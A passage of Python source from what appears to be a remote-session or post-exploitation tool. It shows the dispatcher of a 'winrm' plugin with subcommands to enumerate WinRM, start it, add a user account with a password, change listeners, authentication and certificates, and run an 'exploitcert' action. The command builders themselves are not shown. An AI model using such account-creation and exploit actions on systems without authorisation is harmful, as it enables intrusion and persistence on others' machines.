            timeout=60.0,
        )

    if sub in ('unbind', 'un-bind', 'remove'):
        address = rest[0] if rest else '*'
        return _run_winrm_action(
            session, 'winrm cert unbind',
            _build_cert_unbind_command(address),
        )

    session.print(f"Unknown cert subcommand: {args[0]}", 'red')
    session.print(WINRM_USAGE, 'yellow')
    return 1


@plugin.command(
    name='winrm',
    platforms=['windows'],
    description='WinRM enumeration and management (start, adduser, listener, client-config, auth, cert, exploitcert)',
)
def run(session, args):
    if args and args[0].strip().lower() in ('-h', '--help', 'help', '?'):
        session.print(WINRM_USAGE, 'yellow')
        return 0

    if args and args[0].strip().lower() in ('notes', 'note', 'about'):
        session.print(WINRM_NOTES, 'yellow')
        return 0

    if not args:
        return run_collector_plugin(
            session,
            'winrm',
            None,
            build_command,
            format_generic_report,
            timeout=55.0,
        )

    action = args[0].strip().lower()

    if action == 'start':
        return _run_winrm_action(
            session, 'winrm start', _build_start_command(), timeout=60.0,
        )

    if action == 'adduser':
        if len(args) < 3:
            session.print(WINRM_USAGE, 'yellow')
            session.print("Error: winrm adduser requires a username and password.", 'red')
            return 1
        username = args[1].strip()
        password = ' '.join(args[2:])
        if not username or not password:
            session.print(WINRM_USAGE, 'yellow')
            session.print("Error: winrm adduser requires a non-empty username and password.", 'red')
            return 1
        return _run_winrm_action(
            session, 'winrm adduser',
            _build_adduser_command(username, password),
        )

    if action == 'listener':
        return _handle_listener(session, args[1:])

    if action in ('client-config', 'client_config', 'clientconfig'):
        return _handle_client_config(session, args[1:])

    if action in ('auth', 'authentication'):
        return _handle_auth(session, args[1:])

    if action in ('cert', 'certificate', 'certs'):
        return _handle_cert(session, args[1:])

    if action in ('exploitcert', 'exploit-cert', 'deploycert', 'deploy-cert'):
        return _handle_exploitcert(session, args[1:])

    session.print(f"Unknown winrm subcommand: {args[0]}", 'red')
    session.print(WINRM_USAGE, 'yellow')
    return 1